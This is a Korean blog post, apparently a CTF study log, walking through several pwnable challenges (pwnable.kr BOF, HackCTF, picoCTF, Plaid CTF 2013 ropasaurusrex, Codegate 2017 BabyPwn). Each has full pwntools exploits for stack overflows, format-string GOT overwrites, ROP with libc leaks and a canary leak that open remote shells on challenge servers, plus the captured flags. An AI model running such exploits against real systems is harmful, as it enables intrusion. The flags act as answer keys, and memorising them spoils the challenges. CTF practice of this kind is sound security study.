---
layout: post
date: 2021-01-25 00:00:03
title: "Pwnable Exploitation"
categories: Pwnable
tags: [PWN]
author:
  - Jeongwon Jo
---
<strong>앞 전에 포너블을 공부를 조금하다가 다시 안 했는데 오늘부터 다시 하루마다 포너블 문제를 조금씩 풀어보려고 합니다.</strong><br>

---
## PWN D+1 (2021.01.25)<br>

---
Pwnable.kr Challenge : BOF

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

<strong>처음 풀어 볼 문제는 Pwnable.kr의 BOF라는 문제입니다. func 함수를 보면 key의 값이 `0xcafebabe`이면 system 함수를 호출하는 것을 볼 수 있습니다. BOF를 이용해서 key 값을 `0xcafebabe` 바꿔주면 될 거 같습니다.</strong><br>

![](https://github.com/wjddnjs33/image2/blob/main/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-01-25%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%206.16.07.png?raw=true)

<strong>func 중간에 브레이크 포인트를 걸어 key의 주소를 확인해보면 13 + 4 = 52만큼 떨어져 있는 것을 볼 수 있습니다.</strong><br>

```python
from pwn import *
p = remote("pwnable.kr", 9000)

payload = b"a" * 52
payload += p32(0xcafebabe)

p.sendline(payload)
p.interactive()
```

`FLAG : daddy, I just pwned a buFFer :)`

---
HackCTF Challenge : Basic_BOF #1

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+4h] [ebp-34h]
  int v5; // [esp+2Ch] [ebp-Ch]

  v5 = 0x4030201;
  fgets(&s, 45, stdin);
  printf("\n[buf]: %s\n", &s);
  printf("[check] %p\n", v5);
  if ( v5 != 0x4030201 && v5 != 0xDEADBEEF )
    puts("\nYou are on the right way!");
  if ( v5 == 0xDEADBEEF )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
    puts("Shell closed! Bye.");
  }
  return 0;
}
```

<strong>따로 .c 파일이 주어지지 않아 IDA를 이용해서 코드로 변환해보니, v5의 값이 `0xDEADBEEF`면 system 함수를 호출하는 것을 볼 수 있습니다. 이번 문제도 BOF를 이용해서 v5의 값을 `0xDEADBEEF`로 바꿔주면 될 거 같습니다.</strong><br>

```
v5  = 34h - Ch
v5 = 40
```
<strong>v5는 s와 40만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3000)

payload = b'a' * (52 - 12)
payload += p32(0xDEADBEEF)

p.sendline(payload)
p.interactive()
```

`FLAG : HackCTF{f1r57_574ck_buff3r_0v3rfl0w_5ucc355}`

---
HackCTF Challenge : Basic_BOF #2

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-8Ch]
  void (*v5)(void); // [esp+8Ch] [ebp-Ch]

  v5 = (void (*)(void))sup;
  fgets(&s, 133, stdin);
  v5();
  return 0;
}

(...)

int shell()
{
  return system("/bin/dash");
}

// shell addr : 0x804849B
```
<strong>1번과 마찬가치로 IDA를 이용해서 코드로 변환해주었습니다. 코드를 보니 문자열 변수 s와 함수 포인터 v5를 정의하는 것을 볼 수 있습니다. 그리고 마지막에는 v5 함수를 호출하고 있습니다. BOF 취약점을 이용해서 v5 포인터 변수의 값으로 shell 함수의 주소를 넣어주면 v5 함수를 호출 할 때 shell 함수가 호출이 될 것 입니다.</strong><br>

```
*v5 = 8Ch - Ch
*v5 = 128
```
<strong>*v5는 s와 128만큼 떨어져 있다는 것을 알 수 있습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3001)

payload = b'a' * 128
payload += p32(0x804849B)

p.sendline(payload)
p.interactive()
```

`FLAG : HackCTF{h3y_dud3_600d_f0r_y0u}`

---
HackCTF Challenge : Basic_FSB

```c
// main

int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  vuln();
  return 0;
}
```

```c
// vuln

int vuln()
{
  char s; // [esp+0h] [ebp-808h]
  char format; // [esp+400h] [ebp-408h]

  printf("input : ");
  fgets(&s, 1024, stdin);
  snprintf(&format, 0x400u, &s);
  return printf(&format);
}
```

```c
// flag()

int flag()
{
  puts("EN)you have successfully modified the value :)");
  puts(aKr);
  return system("/bin/sh");
}
```
<strong>IDA를 이용해서 코드로 변환을 해주었습니다. main 함수를 보면 vuln 함수를 호출하고 있고, vulln 함수를 보면 snprintf 함수에서 두 번째 매개변수로 서식 문자가 정의되어 있지 않아 FSB 취약점이 발생합니다. 그래서 FSB 취약점을 이용해서 printf 함수의 got를 flag 함수의 주소로 덮어주면 printf 함수가 실행될 때, flag 함수가 실행이 될 것 입니다.</strong><br>

```
root@py:~/pwn/HackCTF/B_F# ./basic_fsb
input : aaaa.%x.%x.%x.%x.%x
aaaa.f7fc5c75.61616161.2e78252e.252e7825.78252e78
root@py:~/pwn/HackCTF/B_F#

// gdb -q ./basic_fsb
gdb-peda$ x/i 0x80483d0
   0x80483d0 <printf@plt>:      jmp    DWORD PTR ds:0x804a00c
gdb-peda$ p flag
$2 = {<text variable, no debug info>} 0x80485b4 <flag>
gdb-peda$ 
```
<strong>바이너리 파일을 실행해서 오프셋을 확인해보니 두 번째 서식 문자에서 `aaaa`의 값이 출력되는 것을 볼 수 있고, printf got, flag 함수의 주소는 위와 같습니다.</strong><br>

```python
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3002)

payload = fmtstr_payload(2, {0x804a00c:0x80485b4})

p.sendline(payload)
p.interactive()

# 32 비트에서는 fmtstr_payload 함수를 이용해도 잘 되지만 64 비트에서는 거의 안 됨.
# 처음 풀 때 어려워 했는데 이해하고 다시 보니, webhacking.kr 1번 문제 느낌.
```

`FLAG : HackCTF{여보게_오늘_반찬은_포맷스트링이_어떠한가?}`

---
PicoCTF Challenge : authenticate

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

int authenticated = 0;

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

void read_flag() {
  if (!authenticated) {
    printf("Sorry, you are not *authenticated*!\n");
  }
  else {
    printf("Access Granted.\n");
    flag();
  }

}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  printf("Would you like to read the flag? (yes/no)\n");

  fgets(buf, sizeof(buf), stdin);
  
  if (strstr(buf, "no") != NULL) {
    printf("Okay, Exiting...\n");
    exit(1);
  }
  else if (strstr(buf, "yes") == NULL) {
    puts("Received Unknown Input:\n");
    printf(buf);
  }
  
  read_flag();

}
```
<strong>main 함수 else if 문을 보면 printf 함수를 호출하는 데 이때 FSB 취약점이 발생합니다. 그리고 flag는 read_flag 함수에서 authenticated의 값이 참이면 flag 함수를 호출해서 flag를 출력해줍니다. 즉 전역 변수인 authenticated의 값을 FSB 취약점을 이용해서 참(1)으로 변조하면 됩니다.</strong><br>

```
root@py:~/pwn/picoCTF# ./auth
Would you like to read the flag? (yes/no)
aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Received Unknown Input:

aaaa.80489a6.f7ec1580.804875a.f7ec1000.ff992024.ff992028.ff9920f4.3.0.0.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.Sorry, you are not *authenticated*!
```
<strong>바이너리 파일을 이용해 오프셋을 확인해 보니 11인 것을 알 수 있었습니다.</strong><br>

```python
from pwn import *

p = remote("2018shell2.picoctf.com", 52918)
e = ELF("./auth")
auth = e.sym['authenticated']

payload = fmtstr_payload(11, {auth:1})
p.sendline(payload)
p.interactive()
```

`FLAG : picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_d29a706d}`

---
## PWN D+2 (2021.01.26)<br>

---
Plaid CTF 2013 - Challenge : ropasaurusrex 

<strong>이번에 풀어 볼 문제는 Plaid CTF 2013에서 나온 32 bit ROP 문제입니다. 32 bit ROP를 이해하고, 풀어보니 포너블 뉴비분들은 재밌게 풀 수 있을 거 같습니다. 일단 IDA를 이용해서 바이너리를 코드로 변환 시켜 주겠습니다.</strong><br>

```c
ssize_t __cdecl main()
{
  sub_80483F4();
  return write(1, "WIN\n", 4u);
}
```
<strong>main() 함수를 보면 sub_80483F4() 함수를 호출하고, `WIN`을 출력하고 끝나는 것을 볼 수 있습니다.</strong><br>

```c
ssize_t sub_80483F4()
{
  char buf; // [esp+10h] [ebp-88h]

  return read(0, &buf, 0x100u);
}
```
<strong>sub_80483F4() 함수를 보면 buf라는 변수를 정의하고, read 함수를 이용해서 buf의 입력 받고 있습니다. 하지만 buf의 크기는 88h인데 read() 함수에세ㅓ 100h 만큼 입력 받고 있기 때문에 BOF 취약점이 발생합니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ ./ropasaurusrex 
AAAA
WIN
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ 
```
<strong>위 결과는 바이너리 파일을 실행시킨 것 입니다. 입력을 받고, `WIN`을 출력함과 동시에 종료되는 것을 볼 수 있습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ checksec --file=ropasaurusrex
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		ropasaurusrex
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ 
```
<strong>위 결과는 checksec를 이용해 보호 기법을 확인한 결과인데, 보면 NX Bit가 활성화 되어 있는 것을 볼 수 있습니다. NX Bit가 활성화 되어 있기 때문에 BOF 취약점을 이용해서 buf에 쉘코드를 삽입하고, ret에 buf를 준다고해도 실행 권한이 없어 실행되지 않을 것 입니다. 하지만 ROP를 이용해서 NX Bit를 우회해 익스를 진행할 수 있습니다.</strong><br>

```
gdb-peda$ disas read
Dump of assembler code for function read@plt:
   0x0804832c <+0>:	jmp    DWORD PTR ds:0x804961c
   0x08048332 <+6>:	push   0x18
   0x08048337 <+11>:	jmp    0x80482ec
End of assembler dump.
gdb-peda$ disas write
Dump of assembler code for function write@plt:
   0x0804830c <+0>:	jmp    DWORD PTR ds:0x8049614
   0x08048312 <+6>:	push   0x8
   0x08048317 <+11>:	jmp    0x80482ec
End of assembler dump.
gdb-peda$

// read got  : 0x0804961c
// read plt  : 0x0804832c
// write got : 0x08049614
// write plt : 0x0804830c
```
<strong>gdb를 이용해서 read/write의 plt/got를 알아냈습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d ropasaurusrex | grep -B4 "ret"
(생략)
--
 80484b5:	5b                   	pop    %ebx
 80484b6:	5e                   	pop    %esi
 80484b7:	5f                   	pop    %edi
 80484b8:	5d                   	pop    %ebp
 80484b9:	c3                   	ret    
 80484ba:	8b 1c 24             	mov    (%esp),%ebx
 80484bd:	c3                   	ret    
--
(생략)

// pop pop pop r : 0x080484b6
```
<strong>objdump를 이용해서 pppr을 알아냈습니다 pppr을 구하는 이유는 read/write 함수의 인자는 3개이기 때문입니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d /lib32/libc.so.6 | grep __read
(생략)
   df11b:	e8 00 65 00 00       	call   e5620 <__read@@GLIBC_2.0>
   df27a:	e8 a1 63 00 00       	call   e5620 <__read@@GLIBC_2.0>
   df42e:	e8 ed 61 00 00       	call   e5620 <__read@@GLIBC_2.0>
000e5620 <__read@@GLIBC_2.0>:
   e5639:	75 1d                	jne    e5658 <__read@@GLIBC_2.0+0x38>
   e564c:	77 52                	ja     e56a0 <__read@@GLIBC_2.0+0x80>
   e5680:	77 28                	ja     e56aa <__read@@GLIBC_2.0+0x8a>
(생략)
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -d /lib32/libc.so.6 | grep system
0003ce10 <__libc_system@@GLIBC_PRIVATE>:
   3ce24:	74 0a                	je     3ce30 <__libc_system@@GLIBC_PRIVATE+0x20>
00127030 <svcerr_systemerr@@GLIBC_2.0>:
  12708b:	75 04                	jne    127091 <svcerr_systemerr@@GLIBC_2.0+0x61>
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$

// read offset   : 0xe5620
// system offset : 0x3ce24
```
<strong>objdump를 이용해서 read/system offset을 구했습니다. read offset은 libc의 주소를 릭 하는데 사용되고, system offset은 나중에 system 주소를 릭할 때 사용됩니다.</strong><br>

```
libc = read_addr - read_offset
system = libc + system_offset
```
<strong>위와 같이 read addr에서 read offset을 빼주면 libc의 시작 주소가 나올 것이고, libc에서 system offset 만큼 더해주면 system 함수의 시작 주소가 나올 것 입니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ objdump -h ropasaurusrex 

ropasaurusrex:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
(생략)
 24 .bss          00000008  08049628  08049628  00000628  2**2
                  ALLOC
(생략)
```
<strong>마지막으로 objdump를 이용해서 `/bin/sh`을 저장할 bss 영역의 주소를 알아냈습니다</strong><br>


- 시나리오<br>

1. write 함수를 호출해서 read 주소를 릭한다. read 주소랑 read offset이랑 빼서 libc의 시작 주소를 구하고, libc의 시작 주소에 system offset을 더해서 system의 시작 주소를 구한다.<br>
2. read 함수를 호출해서 bss 영역에 `"/bin/sh"`을 넣어준다.
3. read 함수를 호출해서 read got의 system addr을 넣어준다.
4. read 함수를 호출하면 (3)에서 read got가 system addr로 덮였기 때문에 system 함수가 호출이 되고, 인자값으로는 bss를 넘겨준다. bss에는 `"/bin/sh"`가 들어있다.
<br>

```python
from pwn import *
from time import sleep

p = process("./ropasaurusrex")

read_plt = 0x0804832c
read_got = 0x0804961c
read_off = 0xe5620
write_plt = 0x0804830c
write_got = 0x08049614
pppr = 0x080484b6
dynamic = 0x08049530
system_off = 0x3ce10 

payload = "A" * (136 + 4) # buffer + sfp

# 시나리오 (1)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

# 시나리오 (2)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(dynamic)
payload += p32(8)

# 시나리오 (3)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

# 시나리오 (4)
payload += p32(read_plt)
payload += p32(0x41414141)
payload += p32(dynamic)

p.send(payload)
sleep(1)

readaddr = u32(p.recv(4))
libc_base = readaddr - read_off
system = libc_base + system_off
print hex(libc_base)
print hex(system)

p.send("/bin/sh")
p.send(p32(system))
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/Plaid CTF 2013$ python exploit.py 
[+] Starting local process './ropasaurusrex': pid 8695
0xf7d6e000
0xf7daae10
[*] Switching to interactive mode
$ id
uid=1000(pocas) gid=1000(pocas) groups=1000(pocas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
$ cat key
you_cant_stop_the_ropasaurusrex
$  
```

`FLAG : you_cant_stop_the_ropasaurusrex`

---
## PWN D+3 (2021.01.27)<br>

---
Codagate 2017 Challenge : BabyPwn

<strong>이번에는 Canary Leak + ROP를 이용한 문제를 풀어보겠습니다. 방금 Canary에 대해 공부를 하고, Canary 릭을 해서 푸는 문제가 없나 보니 코게 문제로 하나가 있어 풀어보겠습니다.</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ checksec --file=babypwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols	  No	0		1		babypwn
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ 
```
<strong>checksec을 이용해서 보호 기법을 확인해보니, 카나리와, NX Bit가 걸려있는 것을 확인할 수 있습니다.</strong><br>

```c
unsigned int __cdecl main(int a1, char **a2)
{
  socklen_t addr_len; // [esp+20h] [ebp-30h]
  int optval; // [esp+24h] [ebp-2Ch]
  int v5; // [esp+28h] [ebp-28h]
  struct sockaddr addr; // [esp+2Ch] [ebp-24h]
  struct sockaddr v7; // [esp+3Ch] [ebp-14h]
  unsigned int v8; // [esp+4Ch] [ebp-4h]

  v8 = __readgsdword(0x14u);
  if ( a1 == 2 )
    v5 = atoi(a2[1]);
  else
    v5 = 8181;
  dword_804B1BC = socket(2, 1, 0);
  if ( dword_804B1BC == -1 )
  {
    perror("[!] socket Error!");
    exit(1);
  }
  addr.sa_family = 2;
  *(_WORD *)addr.sa_data = htons(v5);
  *(_DWORD *)&addr.sa_data[2] = 0;
  bzero(&addr.sa_data[6], 8u);
  optval = 1;
  setsockopt(dword_804B1BC, 1, 2, &optval, 4u);
  if ( bind(dword_804B1BC, &addr, 0x10u) == -1 )
  {
    perror("[!] bind Error!");
    exit(1);
  }
  if ( listen(dword_804B1BC, 1024) == -1 )
  {
    perror("[!] listen Error!");
    exit(1);
  }
  while ( 1 )
  {
    while ( 1 )
    {
      addr_len = 16;
      fd = accept(dword_804B1BC, &v7, &addr_len);
      if ( fd != -1 )
        break;
      perror("[!] accept Error!");
    }
    if ( !fork() )
      break;
    close(fd);
    while ( waitpid(-1, 0, 1) > 0 )
      ;
  }
  sub_8048B87();
  close(dword_804B1BC);
  close(fd);
  return __readgsdword(0x14u) ^ v8;
}
```
<strong>IDA를 이용해 코드로 변환해주었습니다. main 함수를 보면 socket을 이용해서 8181 포트로 서버를 여는 것을 볼 수 있습니다. 2020년 1월쯤에 C 언어로 이용해서 소켓으로 서버 구축한 적이 있기 때문에 바로 알아 챌 수 있었습니다. 소켓을 생성하고 마지막에는 sub_8048B87 함수를 호출하는 것을 볼 수 있습니다.</strong><br>

```c
unsigned int sub_8048A71()
{
  int v1; // [esp+1Ch] [ebp-3Ch]
  char v2; // [esp+24h] [ebp-34h]
  unsigned int v3; // [esp+4Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&v2, 0, 0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        sub_80488B1("\n===============================\n");
        sub_80488B1("1. Echo\n");
        sub_80488B1("2. Reverse Echo\n");
        sub_80488B1("3. Exit\n");
        sub_80488B1("===============================\n");
        v1 = sub_804895A();
        if ( v1 != 1 )
          break;
        sub_80488B1("Input Your Message : ");
        sub_8048907(&v2, 100);
        sub_80488B1(&v2);
      }
      if ( v1 != 2 )
        break;
      sub_80488B1("Input Your Message : ");
      sub_8048907(&v2, 100);
      sub_80489C8(&v2);
      sub_80488B1(&v2);
    }
    if ( v1 == 3 )
      break;
    sub_80488B1("\n[!] Wrong Input\n");
  }
  return __readgsdword(0x14u) ^ v3;
}
```
<strong>sub_8048A71 함수를 보면 v1, v2, v3 변수를 정의하는 것을 볼 수 있고, v3은 카나리입니다. 하지만 1번 메뉴와 2번 메뉴를 확인해보면 v2의 크기는 40인데 100만큼 입력 받기 때문에 BOF 취약점이 발생합니다. NX Bit가 걸려 있기 때문에 BOF 취약점을 이용해서 ROP를 해주면 될 거 같고, 카나리가 걸려 있기 때문에 카나리부터 릭을 해야합니다.</strong><br>

```python
from pwn import *
p = remote("127.0.0.1", 8181)

# Canary Leak
p.sendlineafter("> ","1")
p.sendafter(": ", "a" * 41)
canary = u32("\x00" + p.recv(1024)[41:44])

log.info("Canary : {}".format(hex(canary)))
```
<strong>Canary는 위와 같이 릭을 할 수 있습니다. v2의 값으로 `"a"`를 40개 주게 되면 v2 변수가 꽉차 v3 변수와 이어지게 됩니다. 하지만 v2를 꽉 채워주지 않으면 남은 메모리에 Null 값이 삽입되기 때문에 Canary를 릭할 수 없습니다. 하지만 40개를 다 채워줬는데 Canary가 출력 되지 않는데 이는 Canary에 시작도 Null로 시작하기 때문입니다. 그래서 `"a"`를 41개를 줘 Canary에 시작인 Null 값도 덮으면 Canary 전체를 릭할 수 있습니다.(Null 값이 존재하면 더 이상 읽지 않음)</strong><br>

```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ objdump -h babypwn 

babypwn:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn

(생략)
 24 .bss          0000000c  0804b1b4  0804b1b4  000021b4  2**2
                  ALLOC
(생략)
```
<strong>objdump를 이용해 bss를 구했습니다.</strong><br>


```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ gdb -q ./babypwn
Reading symbols from ./babypwn...(no debugging symbols found)...done.
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x8048620 <system@plt>
gdb-peda$ 
```
<strong>그리고 해당 파일에 system 함수가 존재하기 때문에 libc를 따로 구하지 않아도 될 거 같습니다. 이제 Canary를 릭하고, system 함수가 존재하는 것을 알았기 때문에 ROP를 해보겠습니다.</strong><br>

- 시나리오<br>

1. 카나리를 릭한다 (Null 값 조심).
2. recv 함수를 이용해서 bss에 Command를 넣어준다. (bss에 값을 넣어줄 수 있는 함수가 recv 함수뿐이 없다)
3. system 함수의 인자로 bss를 넘겨준다. bss에는 `/bin/sh <&4 >&0`가 들어있다. <br>

```python
from pwn import *

p = remote("141.164.52.207", 8181)
E = ELF("./babypwn")

# Canary Leak
p.sendlineafter("> ","1")
p.sendafter(": ", "a" * 41)
canary = u32("\x00" + p.recv(1024)[41:44])

log.info("Canary : {}".format(hex(canary)))

ppppr = 0x8048eec
bss = E.bss()
system_plt = E.plt['system']
recv_plt = E.plt['recv']

command = "/bin/sh <&4 >&0"
log.info("bss : {}".format(hex(bss)))

p.close()

# ROP Exploitation
p = remote("141.164.52.207", 8181)

# ROP Channing
payload = "a" * 40
payload += p32(canary)
payload += "a" * 12 # Dummy[8] + SFP[4]

payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(4)
payload += p32(bss)
payload += p32(len(command)+1)
payload += p32(0)

payload += p32(system_plt)
payload += "a" * 4
payload += p32(bss)

p.sendlineafter("> ", "1")
p.sendlineafter(": ", payload)

# Exit -> RET 
p.sendlineafter("> ", "3")

p.sendline(command)
p.interactive()
```

```
pocas@pocas-VirtualBox:~/pwn/Codagate 2017$ python exploit.py 
[+] Opening connection to 141.164.52.207 on port 8181: Done
[*] '/home/pocas/pwn/Codagate 2017/babypwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Canary : 0x72c6c200
[*] bss : 0x804b1b4
[*] Closed connection to 141.164.52.207 port 8181
[+] Opening connection to 141.164.52.207 on port 8181: Done
[*] Switching to interactive mode
$ cat flag
FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}
$  
```

`FLAG : FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}`

---
